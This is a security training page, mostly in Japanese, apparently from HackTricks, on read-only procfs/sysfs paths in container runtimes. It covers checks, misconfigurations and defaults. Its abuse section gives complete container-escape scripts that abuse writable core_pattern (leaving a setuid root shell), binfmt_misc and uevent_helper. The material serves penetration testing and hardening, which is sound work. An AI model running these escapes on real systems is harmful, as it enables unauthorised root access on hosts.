# 読み取り専用システムパス

{{#include ../../../../banners/hacktricks-training.md}}

読み取り専用のシステムパスは、マスクされたパスとは別の保護機構です。パスを完全に隠す代わりに、ランタイムはそのパスを公開しますが読み取り専用でマウントします。これは、読み取りが許容されるか運用上必要であっても、書き込みは危険すぎる特定の procfs や sysfs の場所で一般的です。

目的は明白です: 多くのカーネルインターフェースは書き込み可能になると格段に危険になります。読み取り専用のマウントは情報収集の価値を完全に取り除くわけではありませんが、侵害されたワークロードがそのパスを通じて基盤となるカーネル向けファイルを変更することを防ぎます。

## 動作

ランタイムは proc/sys ビューの一部を読み取り専用としてマークすることがよくあります。ランタイムやホストによっては、次のようなパスが含まれる場合があります:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

実際のリストは環境により異なりますが、モデルは同じです: 必要な箇所で可視性を許可し、デフォルトで変更を禁止します。

## ラボ

Docker が宣言した読み取り専用パスの一覧を確認する:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
container 内でマウントされている proc/sys の表示を確認する:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## セキュリティへの影響

読み取り専用のシステムパスは、ホストに影響を及ぼす多くの悪用の範囲を狭める。攻撃者が procfs や sysfs を調査できたとしても、そこへ書き込みできないことは、カーネルのチューナブル、クラッシュハンドラ、モジュールロード補助、その他の制御インターフェースに関わる多数の直接的な改変経路を排除する。露出が完全になくなるわけではないが、情報開示からホストへの影響への移行は難しくなる。

## 誤設定

主なミスは、機微なパスのマスク解除や再マウントで読み書き可能にしてしまうこと、書き込み可能な bind mounts でホストの proc/sys 内容を直接公開してしまうこと、あるいは安全なランタイムのデフォルトを事実上バイパスする privileged モードを使用することだ。Kubernetes では、`procMount: Unmasked` と privileged なワークロードが、弱い proc 保護と共に発生することが多い。もう一つの一般的な運用ミスは、ランタイムが通常これらのパスを読み取り専用でマウントするため、すべてのワークロードがそのデフォルトを継承していると仮定してしまうことだ。

## 悪用

保護が弱い場合、まず書き込み可能な proc/sys エントリを探すことから始める:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
書き込み可能なエントリが存在する場合、価値の高いフォローアップ経路には次のものが含まれます:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.

Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
パスが実際にホストのカーネルに到達すると、payload はホスト上で実行され、setuid shell を残します。

### 完全な例: `binfmt_misc` の登録

もし `/proc/sys/fs/binfmt_misc/register` が書き込み可能であれば、カスタムインタプリタの登録により、該当するファイルが実行されたときにコード実行を引き起こすことができます:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
ホストに露出している書き込み可能な `binfmt_misc` 上では、結果として kernel-triggered interpreter path におけるコード実行が得られます。

### 完全な例: `uevent_helper`

もし `/sys/kernel/uevent_helper` が書き込み可能であれば、kernel はマッチするイベントがトリガーされたときに host-path helper を呼び出すことがあります:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
理由がこれほど危険であるのは、ヘルパーパスが安全なコンテナ専用のコンテキストではなく、ホストのファイルシステムの観点から解決されるためです。

## Checks

これらのチェックは、procfs/sysfs の露出が期待される箇所で読み取り専用になっているか、そしてワークロードが依然として機密性の高いカーネルインターフェースを変更できるかどうかを判定します。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- 通常のハードニングされたワークロードは、書き込み可能な proc/sys エントリを非常に少なくするべきです。
- 書き込み可能な `/proc/sys` パスは、単なる読み取りアクセスより重要なことが多いです。
- ランタイムがパスを読み取り専用と示しているが実際には書き込み可能な場合は、mount propagation、bind mounts、privilege 設定を注意深く確認してください。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Docker defines a default read-only path list for sensitive proc entries | ホストの proc/sys マウントを露出させること、`--privileged` |
| Podman | Enabled by default | Podman applies default read-only paths unless explicitly relaxed | `--security-opt unmask=ALL`、広範なホストマウント、`--privileged` |
| Kubernetes | Inherits runtime defaults | Uses the underlying runtime read-only path model unless weakened by Pod settings or host mounts | `procMount: Unmasked`、privileged workloads、書き込み可能なホストの proc/sys マウント |
| containerd / CRI-O under Kubernetes | Runtime default | Usually relies on OCI/runtime defaults | Kubernetes の行と同様；ランタイム設定を直接変更すると動作が弱体化する可能性がある |

重要な点は、読み取り専用のシステムパスは通常ランタイムのデフォルトとして存在するが、privileged モードやホストの bind mounts によって簡単に無効化できることです。
{{#include ../../../../banners/hacktricks-training.md}}
